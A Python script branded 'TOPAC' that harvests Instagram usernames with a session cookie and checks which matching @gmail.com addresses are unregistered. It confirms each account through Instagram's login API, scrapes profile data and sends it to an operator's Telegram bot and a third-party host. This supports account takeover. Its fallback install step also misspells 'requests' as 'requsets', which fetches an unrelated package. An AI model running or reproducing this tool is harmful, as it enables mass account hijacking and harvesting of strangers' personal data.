try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
H = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني7
F = '\033[2;32m' #اخضر
A = '\033[3;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[8;31m' # احمر.
import os
from pyfiglet import figlet_format
import sys
import requests
font= 'banner3-D'
txt= "TOPAC"
topac = figlet_format(f'{txt}',font =f'{font}')
print(F+topac)
print(C+'='*35)
osa = requests.get("https://raw.githubusercontent.com/FIwbNsbs/tt/main/File_Libs/taha")
password = input(f'     {B}ENTAR {X}PASSWORD:{F} ')
if password == "" :
  sys.exit()
if password in str(osa.text):
  print(" FIRST STEP Is Done. Logged in Successfully as ")
  print("Please Wait 5 Minutes, All Packages Are Checking.....")
  os.system("clear")
else:
  print (X+"    توقفت الاداة للتفعيل راسل المطور   @iiit5      ")
  sys.exit()
  os.system("clear")
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

font= 'banner3-D'
txt= "TOPAC"
topac = figlet_format(f'{txt}',font =f'{font}')
print(F+topac)
print('=============================')
sid = input(f' {C}ENTAR SESSIONID {X}⇨ {C}  ')
print("\n")
token = input(f' {X}ENTAR TOKEN BOT {C}⇨ {X}  ')
print('\n')
ID = input(f' {C}ENTAR ID TELEGRAM :{X}⇨ {C}  ')
print('\n')
os.system("clear")
head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
l=0
b=0
u=0
m=0
P=0
x=0
G=0
aa=0
a=0
K=0
j=0
font= 'banner3-D'
txt= "TOPAC"
topac = figlet_format(f'{txt}',font =f'{font}')
print(F+topac)
def check(email,user):
 global l,u,P,K,j,G
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
 	P+=1
 	os.system('cls'if os.name=='nt'else'clear')
 	fff=("\033[1;32m")
 	print(fff+topac)
 	print(f' \033[1;97mGmail True\033[1;33m ➪  \033[1;32m{P} \n \033[1;97mBaNd email\033[1;33m ➪ \033[1;31m {u} \n \033[1;97mBaNd InSTa\033[1;33m ➪ \033[1;31m {l} \n \033[1;33mUsEr\033[1;36m ⇨ \033[1;97m {email}')
 	rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
 	nam = str(rr['graphql']['user']['full_name'])
 	iddd = str(rr['graphql']['user']['id'])
 	fol = str(rr['graphql']['user']['edge_followed_by']['count'])
 	fols =str(rr['graphql']['user']['edge_follow']['count'])
 	isp = str(rr['graphql']['user']['is_private'])
 	bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
 	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
 	ree = re.json()
 	dat = ree['data']
 	tlg =(f"""
----------------------------------------• ➤
𝙉𝘼𝙈𝙀 » {nam}
𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 » {user}
𝙀𝙈𝘼𝙄𝙇 » {email}
𝙁𝙊𝙇𝙇𝙊𝙒𝙍𝙎 » {fol}
𝙁𝙊𝙇𝙇𝙊𝙒𝙍𝙂 » {fols}
𝘿𝘼𝙏𝘼 » {dat}
𝙋𝙊𝙎𝙏𝙍 » {bio}
𝙇𝙄𝙉𝙆 » https://www.instagram.com/{user}
---------------------------------------• ➤
𝙏𝙊𝙋𝘼𝘾 » @OYOYV | @iiit5 """)
 	print(f'{E}====================================')
 	requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 l+=1
	 os.system('cls'if os.name=='nt'else'clear')
	 fff=("\033[1;32m")
	 print(fff+topac)
	 print(f' \033[1;97mGmail True\033[1;33m ➪  \033[1;32m{P} \n \033[1;97mBaNd email\033[1;33m ➪ \033[1;31m {u} \n \033[1;97mBaNd InSTa\033[1;33m ➪ \033[1;31m {l} \n \033[1;33mUsEr\033[1;36m ⇨ \033[1;97m {email}')
	 
def yahoo(email,user):
	global l,u,P,K,j,G
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    check(email,user)
	    K+=1
	    os.system('cls'if os.name=='nt'else'clear')
	    fff=("\033[1;32m")
	    print(fff+topac)
	    print(f' \033[1;97mGmail True\033[1;33m ➪  \033[1;32m{P} \n \033[1;97mBaNd email\033[1;33m ➪ \033[1;31m {u} \n \033[1;97mBaNd InSTa\033[1;33m ➪ \033[1;31m {l} \n \033[1;33mUsEr\033[1;36m ⇨ \033[1;97m {email}')
	else:
	    u+=1
	    os.system('cls'if os.name=='nt'else'clear')
	    fff=("\033[1;32m")
	    print(fff+topac)
	    print(f' \033[1;97mGmail True\033[1;33m ➪  \033[1;32m{P} \n \033[1;97mBaNd email\033[1;33m ➪ \033[1;31m {u} \n \033[1;97mBaNd InSTa\033[1;33m ➪ \033[1;31m {l} \n \033[1;33mUsEr\033[1;36m ⇨ \033[1;97m {email}')
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='56789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    yahoo(email,user)
  except IndexError:
   users()
users()